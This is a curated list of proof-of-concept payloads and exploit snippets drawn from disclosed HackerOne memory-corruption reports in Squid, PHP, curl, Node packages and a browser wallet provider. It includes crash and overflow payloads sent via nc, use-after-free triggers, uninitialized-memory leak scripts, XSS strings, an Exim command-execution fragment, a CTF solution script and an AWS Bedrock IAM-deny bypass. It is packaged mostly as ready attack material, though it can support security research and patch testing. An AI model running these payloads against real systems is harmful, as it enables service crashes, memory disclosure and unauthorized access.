# Memory Corruption  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#778610](https://hackerone.com/reports/778610)  -  Squid as reverse proxy RCE and data leak
*critical*

```
mkdir squid-poc
cd squid-poc/
wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'
tar zxf SQUID_4_8.tar.gz
mkdir squid-install
cd squid-SQUID_4_8/
autoreconf -if
./configure --prefix=$(realpath ../squid-install)
make -j$(nproc)
make install
cd ../squid-install/sbin/
```

## 2. [#1977252](https://hackerone.com/reports/1977252)  -  UAF on JSEthereumProvider
*critical*

```
function triggerGC() {
  for (let i = 0; i < 100; i++) {
    let a = new Array(1000000);
  }
}

let uafObj = ethereum._metamask;
delete ethereum;
triggerGC();
console.log(await uafObj.isUnlocked());
```

## 3. [#178144](https://hackerone.com/reports/178144)  -  imagecropauto out-of-bounds access
*low, $500*

```
https://github.com/php/php-src/blob/master/ext/gd/libgd/gd_crop.c#L227

gdImagePtr gdImageCropThreshold(gdImagePtr im, const unsigned int color, const float threshold)
{
...
	match = 1;
	for (y = 0; match && y < height; y++) {
		for (x = 0; match && x < width; x++) {
			match = (gdColorMatch(im, color, gdImageGetPixel(im, x,y), threshold)) > 0;
		}
	}
...
```

## 4. [#966347](https://hackerone.com/reports/966347)  -  [bl] Uninitialized memory exposure via negative .consume()
*high*

```
const { BufferList } = require('bl')
const secret = require('crypto').randomBytes(256)
for (let i = 0; i < 1e6; i++) {
  const clone = Buffer.from(secret)
  const bl = new BufferList()
  bl.append(Buffer.from('a'))
  bl.consume(-1024)
  const buf = bl.slice(1)
  if (buf.indexOf(clone) !== -1) {
    console.error(`Match (at ${i})`, buf)
  }
}
```

## 5. [#1977252](https://hackerone.com/reports/1977252)  -  UAF on JSEthereumProvider
*critical*

```http
delete ethereum;
```

## 6. [#2101076](https://hackerone.com/reports/2101076)  -  HackerOne SAML signup domain enforcement bypass results in unauthorized access to HackerOne PullRequest organization
*high*

```http
POST /users HTTP/1.1
Host: hackerone.com

user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

## 7. [#2101076](https://hackerone.com/reports/2101076)  -  HackerOne SAML signup domain enforcement bypass results in unauthorized access to HackerOne PullRequest organization
*high*

```http
POST /users HTTP/1.1
Host: hackerone.com

user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com%0d%0a&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

## 8. [#2101076](https://hackerone.com/reports/2101076)  -  HackerOne SAML signup domain enforcement bypass results in unauthorized access to HackerOne PullRequest organization
*high*

```http
POST /users HTTP/1.1
Host: hackerone.com
```

## 9. [#641240](https://hackerone.com/reports/641240)  -  Basic Authentication Heap Overflow
*high*

```http
GET ftp://<squid_name>:<squid_port>/squid-internal-mgr/menu HTTP/1.1 

Authorization: Basic QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF
```

## 10. [#1178337](https://hackerone.com/reports/1178337)  -  Improper handling of untypical characters in domain names
*high*

```bash
$ node main.js cnamezeroweb.test.xdi-attack.net

node     resolveCname     cnamezeroweb.test.xdi-attack.net - -  IN    CNAME zero.longtxtrecord.ml

$ node main.js cnamexss.test.xdi-attack.net

node     resolveCname     cnamexss.test.xdi-attack.net  - -  IN    CNAME <img/src=''/onerror='alert&#x28&#x22xss&#x22&#x29'>.a.cnamexss.test.xdi-attack.net
```

## 11. [#1977252](https://hackerone.com/reports/1977252)  -  UAF on JSEthereumProvider
*critical*

```cpp
// 1. Create a new handle to JSEthereumProvider and convert it to a v8::Object
gin::Handle<JSEthereumProvider> provider =
    gin::CreateHandle(isolate, new JSEthereumProvider(render_frame));
if (provider.IsEmpty()) {
  return;
}
v8::Local<v8::Value> provider_value = provider.ToV8();
v8::Local<v8::Object> provider_object =
    provider_value->ToObject(context).ToLocalChecked();

// 2. Create a v8::Proxy for the provider
if (!v8::Proxy::New(context, provider_object, ethereum_proxy_handler_obj)
         .ToLocal(&ethereum_proxy)) {
  // Error handling
}

// 3. Expose it through window.ethereum
global
    ->Set(context, gin::StringToSymbol(isolate, kEthereum), ethereum_proxy)
    .Check();

// 4. Create a new v8::Object and make it accessible through ethereum._metamask
v8::Local<v8::Object> metamask_obj = v8::Object::New(isolate);
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kMetaMask), metamask_obj)
    .Check();

// 5. [BUG] Set a new property called `IsUnlocked`, creating a new callback object bound to `base::Unretained(provider.get())`, making the wrong assumption that ethereum._metamask can never outlive ethereum
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kIsUnlocked),
          gin::CreateFunctionTemplate(
              isolate, base::BindRepeating(&JSEthereumProvider::IsUnlocked,
                                           base::Unretained(provider.get())))
              ->GetFunction(context)
              .ToLocalChecked())
# … truncated …
```

## 12. [#320222](https://hackerone.com/reports/320222)  -  memory corruption while parsing HTTP response
*medium, $500*

```bash
$ nc -vvlp 8080 < poc
Listening on [0.0.0.0] (family 0, port 8080)
Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)
GET / HTTP/1.0
Host: localhost:8080
Connection: close

$ bin/php -r 'file_get_contents("http://localhost:8080");'
```

## 13. [#320222](https://hackerone.com/reports/320222)  -  memory corruption while parsing HTTP response
*medium, $500*

```http
GET / HTTP/1.0
Host: localhost:8080

$ bin/php -r 'file_get_contents("http://localhost:8080");'
```

## 14. [#1210450](https://hackerone.com/reports/1210450)  -  1-byte heap buffer overflow in DNS resolver
*medium*

```http
Patch for the issue can be found here:

http://nginx.org/download/patch.2021.resolver.txt
```

## 15. [#1199527](https://hackerone.com/reports/1199527)  -  CORS Misconfiguration, could lead to disclosure of sensitive information
*medium*

```http
GET /dashboard HTTP/1.1
Host: app.upchieve.org
Origin: https://yiopwxxzxvtf.com

Response:
```

## 16. [#824771](https://hackerone.com/reports/824771)  -  UrnState Heap Overflow
*critical*

```bash
$ export CFLAGS="${CFLAGS} -fsanitize=address -g"
$ export CXXFLAGS="${CXXFLAGS} ${CFLAGS}"

$./configure
```

## 17. [#1065517](https://hackerone.com/reports/1065517)  -  h1 hacky holidays CTF solution
*critical*

```
echo "Flag 1 -- robots.txt"
curl https://hackyholidays.h1ctf.com/robots.txt 2>/dev/null | grep flag

echo ""
echo "Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )"
diff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep "h1"

echo ""
echo "Flag 3 -- /people-rater"
curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 2>/dev/null | grep flag

echo ""
echo "Flag 4 -- /swag-shop"
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 2>/dev/null | grep flag

echo ""
echo "Flag 5 -- /secure-login (access:computer)"
wget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null
unzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null
cat flag.txt
rm my_secure_files_not_for_you.zip
rm flag.txt
rm xxx.png

echo ""
echo "Flag 6 -- /my-diary"
curl https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php 2>/dev/null | grep flag

echo ""
echo "flag 7 -- /hate-mail-generator"
curl -X POST https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview --data 'preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"}' 2>/dev/null | grep flag


echo ""
echo "flag 8 -- /forum (grinch:BahHumbug)"
# … truncated …
```

## 18. [#482200](https://hackerone.com/reports/482200)  -  puttygen: heap-buffer-overflow in mp_get_decimal()
*low*

```
==23803== Memcheck, a memory error detector
==23803== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.
==23803== Using Valgrind-3.12.0.SVN and LibVEX; rerun with -h for copyright info
==23803== Command: ./puttygen -L ../../putty-0.70-2019-01-17.53747ad/tmp/out/crashes/test0013.ppk
==23803==
==23803== Invalid read of size 8
==23803==    at 0x118B3F: mp_get_decimal (mpint.c:412)
==23803==    by 0x12C05A: ssh1_pubkey_str (sshpubk.c:1363)
==23803==    by 0x12C0E0: ssh1_write_pubkey (sshpubk.c:1375)
==23803==    by 0x10DFFB: main (cmdgen.c:970)
==23803==  Address 0x53de1b0 is 0 bytes after a block of size 16 alloc'd
==23803==    at 0x4C2BBAF: malloc (vg_replace_malloc.c:299)
==23803==    by 0x116727: safemalloc (memory.c:23)
==23803==    by 0x11725B: mp_make_sized (mpint.c:38)
==23803==    by 0x118B0F: mp_get_decimal (mpint.c:408)
==23803==    by 0x12C05A: ssh1_pubkey_str (sshpubk.c:1363)
==23803==    by 0x12C0E0: ssh1_write_pubkey (sshpubk.c:1375)
==23803==    by 0x10DFFB: main (cmdgen.c:970)
==23803==
==23803== Invalid read of size 8
==23803==    at 0x118B3F: mp_get_decimal (mpint.c:412)
==23803==    by 0x12C066: ssh1_pubkey_str (sshpubk.c:1364)
==23803==    by 0x12C0E0: ssh1_write_pubkey (sshpubk.c:1375)
==23803==    by 0x10DFFB: main (cmdgen.c:970)
==23803==  Address 0x53de390 is 0 bytes after a block of size 16 alloc'd
==23803==    at 0x4C2BBAF: malloc (vg_replace_malloc.c:299)
==23803==    by 0x116727: safemalloc (memory.c:23)
==23803==    by 0x11725B: mp_make_sized (mpint.c:38)
==23803==    by 0x118B0F: mp_get_decimal (mpint.c:408)
==23803==    by 0x12C066: ssh1_pubkey_str (sshpubk.c:1364)
==23803==    by 0x12C0E0: ssh1_write_pubkey (sshpubk.c:1375)
==23803==    by 0x10DFFB: main (cmdgen.c:970)
==23803==
0 0 0   -<-    >
==23803== Invalid free() / delete / delete[] / realloc()
# … truncated …
```

## 19. [#1897203](https://hackerone.com/reports/1897203)  -  CVE-2023-27537: HSTS double-free
*low*

```
#include <stdio.h>
#define HAVE_STRUCT_TIMESPEC // [Add] 
#include <pthread.h>
#include <curl/curl.h>

#define NUMT 100

const char* const url = "https://test.local/poc.php";

pthread_mutex_t lock[9];

static void lock_cb(CURL* handle, curl_lock_data data,
    curl_lock_access access, void* userptr)
{
    pthread_mutex_lock(&lock[data]); /* uses a global lock array */
}

static void unlock_cb(CURL* handle, curl_lock_data data,
    void* userptr)
{
    pthread_mutex_unlock(&lock[data]); /* uses a global lock array */
}

static void* pull_one_url(void* shobject)
{
    CURL* curl;

    for (int i = 0; i < 100; i++) {
        curl = curl_easy_init();
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HSTS, "c:\\home\\hsts.txt");
        curl_easy_setopt(curl, CURLOPT_SHARE, shobject);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_perform(curl); /* ignores error */
        curl_easy_cleanup(curl);
    }

    return NULL;
}
# … truncated …
```

## 20. [#320222](https://hackerone.com/reports/320222)  -  memory corruption while parsing HTTP response
*medium, $500*

```bash
$ bin/php --version
PHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
```

## 21. [#3702072](https://hackerone.com/reports/3702072)  -  bedrock-mantle.api.aws accepts Bedrock API keys outside the IAM Deny, CloudTrail signal, and invocation logging AWS publishes for Bedrock keys
*medium*

```bash
$ curl -sS -H "Authorization: Bearer $ABSK" https://bedrock-mantle.us-east-1.api.aws/v1/models | jq '.data | length'
39
```

## 22. [#3702072](https://hackerone.com/reports/3702072)  -  bedrock-mantle.api.aws accepts Bedrock API keys outside the IAM Deny, CloudTrail signal, and invocation logging AWS publishes for Bedrock keys
*medium*

```bash
$ curl -sS -o /dev/null -w "%{http_code}\n" https://bedrock-mantle.us-east-1.api.aws/v1/models
401                                                                       # no bearer
$ curl -sS -H "Authorization: Bearer ABSKBOGUS" -o /dev/null -w "%{http_code}\n" https://bedrock-mantle.us-east-1.api.aws/v1/models
401                                                                       # bogus bearer
$ curl -sS -H "Authorization: Bearer $ABSK"  -o /dev/null -w "%{http_code}\n" https://bedrock-mantle.us-east-1.api.aws/v1/models
200                                                                       # long-term ABSK
$ curl -sS -H "Authorization: Bearer $SHORT" -o /dev/null -w "%{http_code}\n" https://bedrock-mantle.us-east-1.api.aws/v1/models
200                                                                       # short-term bedrock-api-key-*
```

## 23. [#3702072](https://hackerone.com/reports/3702072)  -  bedrock-mantle.api.aws accepts Bedrock API keys outside the IAM Deny, CloudTrail signal, and invocation logging AWS publishes for Bedrock keys
*medium*

```bash
$ aws iam put-user-policy --user-name ████████ --policy-name VDPDenyBedrockBearer \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"bedrock:CallWithBearerToken","Resource":"*"}]}'
$ sleep 10
$ curl -sS -o /dev/null -w "bedrock std: %{http_code}\n" -H "Authorization: Bearer $ABSK" https://bedrock.us-east-1.amazonaws.com/foundation-models
bedrock std: 403                                                          # explicit deny matches
$ curl -sS -o /dev/null -w "mantle:      %{http_code}\n" -H "Authorization: Bearer $ABSK" https://bedrock-mantle.us-east-1.api.aws/v1/models
mantle:      200                                                          # bypass
```

## 24. [#255587](https://hackerone.com/reports/255587)  -  CVE-2017-1000101: cURL: URL globbing out of bounds read
*medium*

```bash
curl supports "globbing" of URLs, in which a user can pass a numerical range
to have the tool iterate over those numbers to do a sequence of transfers.

In the globbing function that parses the numerical range, there was an
omission that made curl read a byte beyond the end of the URL if given a
carefully crafted, or just wrongly written, URL. The URL is stored in a heap
based buffer, so it could then be made to wrongly read something else instead
of crashing.

An example of a URL that triggers the flaw would be
`http://ur%20[0-60000000000000000000`.
```

## 25. [#2187833](https://hackerone.com/reports/2187833)  -  CVE-2023-38545: socks5 heap buffer overflow
*high*

```
; sleep 2;
```

## 26. [#478367](https://hackerone.com/reports/478367)  -  efree() on uninitialized Heap data in imagescale leads to use-after-free
*critical, $1,500*

```
if (overflow2(line_length, sizeof(ContributionType))) {
		gdFree(res);
		return NULL;
	}
	res->ContribRow = (ContributionType *) gdMalloc(line_length * sizeof(ContributionType));
	if (res->ContribRow == NULL) {
		gdFree(res);
		return NULL;
	}
	for (u = 0 ; u < line_length ; u++) {
		if (overflow2(windows_size, sizeof(double))) {
			overflow_error = 1;
		} else {
			res->ContribRow[u].Weights = (double *) gdMalloc(windows_size * sizeof(double));
		}
		if (overflow_error == 1 || res->ContribRow[u].Weights == NULL) {
			unsigned int i;
			u--;
			for (i=0;i<=u;i++) {
                gdFree(res->ContribRow[i].Weights);
			}
```

## 27. [#996041](https://hackerone.com/reports/996041)  -  Image queue default key of 'None' and GraphQL unhandled type exception
*medium, $500*

```html
<script>alert(document.cookie);</script>
```

## 28. [#798744](https://hackerone.com/reports/798744)  -  Null Pointer Dereference in PHP Session Upload Progress
*medium*

```
<?php

$host = 'localhost';
$port = '8000';
$addr = '/index.php';

$type = 'multipart/form-data; boundary=---------------------------2020';
$data = <<<EOF
-----------------------------2020
Content-Disposition: form-data; name="PHPSESSID"

session-upload
-----------------------------2020
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

ryat
-----------------------------2020--
EOF;

$message = "POST $addr  HTTP/1.1\r\n";
$message .= "Content-Type: $type\r\n";
$message .= "Host: $host\r\n";
$message .= "Content-Length: ".strlen($data)."\r\n";
$message .= "Connection: Close\r\n\r\n";
$message .= $data;

$fp = fsockopen($host, $port);
fputs($fp, $message);

$resp = '';
while ($fp && !feof($fp)) {
    $resp .= fread($fp, 1024);
}
var_dump($resp);

?>
```

## 29. [#593229](https://hackerone.com/reports/593229)  -  Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow
*high, $1,500*

```
for (str_left = str_nbytes; str_left > 0; str_left--, p1++) {
```

## 30. [#478368](https://hackerone.com/reports/478368)  -  imagecolormatch Out Of Bounds Write on Heap
*high, $1,500*

```
The buffer is then written to in a for loop.
	for (x=0; x<im1->sx; x++) {
		for( y=0; y<im1->sy; y++ ) {
			color = im2->pixels[y][x];
			rgb = im1->tpixels[y][x];
			bp = buf + (color * 5);
			(*(bp++))++;
			*(bp++) += gdTrueColorGetRed(rgb);
			*(bp++) += gdTrueColorGetGreen(rgb);
			*(bp++) += gdTrueColorGetBlue(rgb);
			*(bp++) += gdTrueColorGetAlpha(rgb);
		}

The buffer is written to by means of a color being the index:
color = im2->pixels[y][x];
..
bp = buf + (color * 5);
```

## 31. [#1178337](https://hackerone.com/reports/1178337)  -  Improper handling of untypical characters in domain names
*high*

```
1.1.1.1.in-addr.arpa.   300     IN      PTR     t\000.example.com.
3.3.3.3.in-addr.arpa.   300     IN      PTR     <img/src=''/onerror='alert&#x28&#x22xss&#x22&#x29'>.example.com.
```

## 32. [#824771](https://hackerone.com/reports/824771)  -  UrnState Heap Overflow
*critical*

```
${CFLAGS}
```

## 33. [#824771](https://hackerone.com/reports/824771)  -  UrnState Heap Overflow
*critical*

```
${CXXFLAGS}
```

## 34. [#296991](https://hackerone.com/reports/296991)  -  Exim use-after-free vulnerability while reading mail header involving BDAT commands
*critical*

```
${run{cmd}
```

## 35. [#1065517](https://hackerone.com/reports/1065517)  -  h1 hacky holidays CTF solution
*critical*

```json
{{test}}
```

## 36. [#1065517](https://hackerone.com/reports/1065517)  -  h1 hacky holidays CTF solution
*critical*

```json
{{email}}
```

## 37. [#1065517](https://hackerone.com/reports/1065517)  -  h1 hacky holidays CTF solution
*critical*

```json
{{template:","email":"38dhs_admins_only_header.html}}
```

## 38. [#3754343](https://hackerone.com/reports/3754343)  -  CVE-2026-9546: sending old referer
*low*

```bash
set -euo pipefail

ROOT="${ROOT:-$PWD}"
WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/curl-referer-uaf-inline-XXXXXX")"
BUILD_DIR="$WORKDIR/build-curl-asan"
SERVER_LOG="$WORKDIR/server.jsonl"
SERVER_ERR="$WORKDIR/server.err"
PORT_FILE="$WORKDIR/port"
CLIENT_C="$WORKDIR/referer_uaf_client.c"
CLIENT_BIN="$WORKDIR/referer_uaf_client"
ASAN_LOG="$WORKDIR/asan.log"
LEAK_LOG="$WORKDIR/leak.log"
SERVER_PID=""

cleanup() {
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" >/dev/null 2>&1 || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
  if [ "${KEEP_WORKDIR:-0}" = "1" ]; then
    echo "[*] workdir kept at: $WORKDIR"
  else
    rm -rf "$WORKDIR"
  fi
}
trap cleanup EXIT

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[!] missing required command: $1" >&2
    exit 1
  }
}

need_cmd cmake
need_cmd cc
need_cmd python3

if [ ! -f "$ROOT/CMakeLists.txt" ] || [ ! -d "$ROOT/lib" ] ||
   [ ! -d "$ROOT/include" ]; then
# … truncated …
```

## 39. [#248609](https://hackerone.com/reports/248609)  -  PHP OpenSSL zif_openssl_seal() heap overflow (wild memcpy)
*medium, $500*

```
41    for (i = 0; i < npubk; i++) {
42        ekl[i] =
43            EVP_PKEY_encrypt_old(ek[i], key, EVP_CIPHER_CTX_key_length(ctx),
44                                 pubk[i]);
45        if (ekl[i] <= 0)
46            return (-1);
47    }
48    return (npubk);
```

## 40. [#248609](https://hackerone.com/reports/248609)  -  PHP OpenSSL zif_openssl_seal() heap overflow (wild memcpy)
*medium, $500*

```
5930		for (i=0; i<nkeys; i++) {
5931			eks[i][eksl[i]] = '\0';
5932			add_next_index_stringl(ekeys, (const char*)eks[i], eksl[i]);
5933			efree(eks[i]);
5934			eks[i] = NULL;
5935		}
```

## 41. [#248659](https://hackerone.com/reports/248659)  -  PHP WDDX Deserialization Heap OOB Read in timelib_meridian()
*medium, $500*

```bash
$ cat repro.wddx 
<?xml version='1.0'?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
<header/>
	<data>
        	<struct>
                    <var name='aDateTime'>
                         <dateTime>I06.00am 0</dateTime>
                     </var>
                </struct>
	</data>
</wddxPacket>
```

## 42. [#1269242](https://hackerone.com/reports/1269242)  -  CVE-2021-22945: UAF and double-free in MQTT sending
*medium*

```
diff --git a/lib/sendf.c b/lib/sendf.c
index e41bb805f..773d4b5b6 100644
--- a/lib/sendf.c
+++ b/lib/sendf.c
@@ -294,6 +294,7 @@ void Curl_failf(struct Curl_easy *data, const char *fmt, ...)
  * If the write would block (CURLE_AGAIN), we return CURLE_OK and
  * (*written == 0). Otherwise we return regular CURLcode value.
  */
+static int CUSTOM_blocked = 0;
 CURLcode Curl_write(struct Curl_easy *data,
                     curl_socket_t sockfd,
                     const void *mem,
@@ -322,8 +323,13 @@ CURLcode Curl_write(struct Curl_easy *data,
   }
 #endif
   bytes_written = conn->send[num](data, num, mem, len, &result);
+  if(!CUSTOM_blocked) {
+    bytes_written = 0;
+    CUSTOM_blocked = 1;
+  }
 
   *written = bytes_written;
+
   if(bytes_written >= 0)
     /* we completely ignore the curlcode value when subzero is not returned */
     return CURLE_OK;
```

## 43. [#330351](https://hackerone.com/reports/330351)  -  `byte` allocates uninitialized buffers and reads data from them past the initialized length
*medium*

```js
var ByteBuffer = require('byte');
for (let k = 0; k < 1e4; k++) {
  var bb = new ByteBuffer();
  for (let i = 0; i < 180; i++) {
    bb.putString('ok');
  }
  const s = bb.getString(1000);
  if (s.includes(' {')) {
    console.log(s);
    console.log('Finished at attempt: ' + k);
    break;
  }
}
```

## 44. [#330351](https://hackerone.com/reports/330351)  -  `byte` allocates uninitialized buffers and reads data from them past the initialized length
*medium*

```js
var ByteBuffer = require('byte');
for (let k = 0; k < 1e4; k++) {
  var bb = ByteBuffer.allocate(50);
  const twos = Buffer.alloc(10, 2);
  for (let i = 0; i < 7; i++) bb.put(twos, 10);
  const s = bb.get(0, 100);
  if (s.includes(' {')) {
    console.log(s.toString('utf-8'));
    console.log('Finished at attempt: ' + k);
    break;
  }
}
```

## 45. [#3735193](https://hackerone.com/reports/3735193)  -  CVE-2026-8925: SASL double-free
*medium*

```c
/* gsasl_shim.c */
#include <gsasl.h>

int gsasl_client_start(Gsasl *ctx, const char *mech, Gsasl_session **out)
{
    (void)ctx; (void)mech; (void)out;
    return GSASL_UNKNOWN_MECHANISM;
}
```

## 46. [#988103](https://hackerone.com/reports/988103)  -  Node.js: use-after-free in TLSWrap
*high*

```
../../../../include/c++/9/bits/unique_ptr.h:154:42
```

## 47. [#988103](https://hackerone.com/reports/988103)  -  Node.js: use-after-free in TLSWrap
*high*

```
../../../../include/c++/9/bits/unique_ptr.h:361:21
```

## 48. [#988103](https://hackerone.com/reports/988103)  -  Node.js: use-after-free in TLSWrap
*high*

```
../../../../include/c++/9/bits/unique_ptr.h:375:16
```

## 49. [#778610](https://hackerone.com/reports/778610)  -  Squid as reverse proxy RCE and data leak
*critical*

```
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc localhost 9999
```

## 50. [#2779070](https://hackerone.com/reports/2779070)  -  Memory Leak in bytes_to_hexstring Function
*low*

```c
char* bytes_to_hexstring(uint8_t* bytes, size_t len)
{
    const char* hexdigs = "0123456789abcdef";
    size_t k = len * 2 + 1;
    char* out = malloc(k);
    for (int i = 0; i < len; i++)
    {
        out[i * 2] = hexdigs[bytes[i] >> 4];
        out[i * 2 + 1] = hexdigs[bytes[i] & 0x0f];
    }
    out[k - 1] = '\0';
    return out;
}
```

## 51. [#2779070](https://hackerone.com/reports/2779070)  -  Memory Leak in bytes_to_hexstring Function
*low*

```c
for (int i = 0; i < 10000; i++) {
    uint8_t data[10] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09};
    char* hex_str = bytes_to_hexstring(data, 10);
    // Do something with hex_str but forget to free it
}
```

## 52. [#2779070](https://hackerone.com/reports/2779070)  -  Memory Leak in bytes_to_hexstring Function
*low*

```c
char* bytes_to_hexstring(uint8_t* bytes, size_t len)
{
    const char* hexdigs = "0123456789abcdef";
    size_t k = len * 2 + 1;
    char* out = malloc(k);
    if (out == NULL) {
        return NULL; // Return NULL if memory allocation fails
    }
    for (int i = 0; i < len; i++) {
        out[i * 2] = hexdigs[bytes[i] >> 4];
        out[i * 2 + 1] = hexdigs[bytes[i] & 0x0f];
    }
    out[k - 1] = '\0';
    return out;
}
```

## 53. [#170619](https://hackerone.com/reports/170619)  -  PHP Integer Overflow in gdImageWebpCtx
*low*

```
for (y = 0; y < gdImageSY(im); y++) {
    for (x = 0; x < gdImageSX(im); x++) {
        register int c;
        register char a;
        c = im->tpixels[y][x];
        a = gdTrueColorGetAlpha(c);
        if (a == 127) {
            a = 0;
        } else {
            a = 255 - ((a << 1) + (a >> 6));
        }
        *(p++) = gdTrueColorGetRed(c);    // heap buffer overflow!!!
        *(p++) = gdTrueColorGetGreen(c);  // heap buffer overflow!!!
        *(p++) = gdTrueColorGetBlue(c);   // heap buffer overflow!!!
        *(p++) = a;    // heap buffer overflow!!!
    }
}
```

## 54. [#321702](https://hackerone.com/reports/321702)  -  `put` allocates uninitialized Buffers when non-round numbers are passed in input
*low*

```js
var Put = require('put');
var buf = Put();
for (var i = 0; i < 10000; i++) buf.pad(0.99);
console.log(buf.buffer().toString('ascii'));
```

## 55. [#180562](https://hackerone.com/reports/180562)  -  Memory corruption in _php_math_number_format_ex()
*low*

```
The problem is that both *integral* variable and *thousand_sep_len* variable are unsigned integers, in 32 bits architectures this means 2^32 - 1 maximum value. So, if we set some appropriate values in *integral* and *thousand_sep_len*, for example: integral = 0x0a and thousand_sep_len = 0x65000000,
```

## 56. [#248601](https://hackerone.com/reports/248601)  -  PHP INI Parsing Stack Buffer Overflow Vulnerability
*medium, $500*

```bash
$ bin/php input.php input.ini

*** buffer overflow detected ***: bin/php terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x68e4e)[0xb7527e4e]
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x6b)[0xb75ba85b]
/lib/i386-linux-gnu/libc.so.6(+0xfa6ea)[0xb75b96ea]
/lib/i386-linux-gnu/libc.so.6(+0xf9e48)[0xb75b8e48]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x8e)[0xb752fc0e]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x89b)[0xb7502f3b]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xb1)[0xb75b8f01]
/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xb75b8e2f]
bin/php[0x82e7aa0]
bin/php[0x82e87d3]
bin/php(zend_parse_ini_file+0x47)[0x82e8b07]
bin/php[0x8255788]
bin/php[0x83631f6]
bin/php(execute_ex+0x22)[0x8353c52]
bin/php(zend_execute+0x13b)[0x83a341b]
bin/php(zend_execute_scripts+0x30)[0x8313010]
bin/php(php_execute_script+0x286)[0x82b3f26]
bin/php[0x83a57de]
bin/php[0x80683b9]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb74d8a83]
bin/php[0x8068444]
======= Memory map: ========
08048000-0888d000 r-xp 00000000 08:01 704181     /home/weilei/php7_gdb/bin/php
0888d000-0888e000 r--p 00844000 08:01 704181     /home/weilei/php7_gdb/bin/php
0888e000-08899000 rw-p 00845000 08:01 704181     /home/weilei/php7_gdb/bin/php
08899000-088b2000 rw-p 00000000 00:00 0 
09ae7000-09b9a000 rw-p 00000000 00:00 0          [heap]
b7000000-b7200000 r--p 00000000 08:01 271314     /usr/lib/locale/locale-archive
b7200000-b7400000 rw-p 00000000 00:00 0 
b7464000-b7480000 r-xp 00000000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1
